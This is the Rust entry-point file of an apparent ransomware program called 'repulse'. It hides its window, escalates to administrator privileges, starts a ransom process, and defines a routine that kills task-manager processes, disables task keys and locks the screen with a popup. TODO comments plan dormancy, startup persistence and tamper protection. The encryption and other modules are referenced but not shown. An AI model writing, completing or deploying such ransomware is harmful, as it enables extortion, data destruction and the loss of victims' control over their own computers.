#![cfg_attr(feature = "release", windows_subsystem = "windows")]
#![feature(atomic_mut_ptr)]
#![feature(is_some_and)]

use std::{panic, time::Duration};

use ransom::initiate_ransom_process;

mod assets;
mod common;
mod elevate;
mod encryption;
mod hardware_info;
mod keyboard;
mod log;
mod ransom;
mod tasks;
mod window;

fn main() {
    panic::set_hook(Box::new(|info| {
        debug!("(PANIC): {}", info);

        debug!("Working directory = {:?}", std::env::current_dir());
        debug!("Current binary = {:?}", std::env::current_exe());
    }));

    // Set the working directory
    std::env::set_current_dir(r"C:\Users\adrian\Documents\Code\wowkster\repulse").unwrap();

    // Clear the log file
    if !is_elevated::is_elevated() {
        std::fs::write(std::path::PathBuf::from("repulse.log"), "").unwrap();
    }

    // TODO: lay dormant for unspecified amount of time

    // If not running as admin, escalate privileges
    elevate::ensure_elevated();

    // TODO: install self into startup

    // TODO: register service to watch for tampering with main executable

    debug!("Starting ransom process");

    initiate_ransom_process();

    debug!("Exiting Gracefully.");

    std::process::exit(0);

    take_over_shell();
}

fn take_over_shell() {
    // Take over keyboard and disallow taskmgr
    tasks::begin_task_genocide();
    keyboard::disable_task_keys();

    // Blocks the main thread with the window message loop
    window::create_popup_window();

    // Cleanup (assuming graceful exit)
    keyboard::enable_task_keys();
    tasks::stop_task_genocide();
}
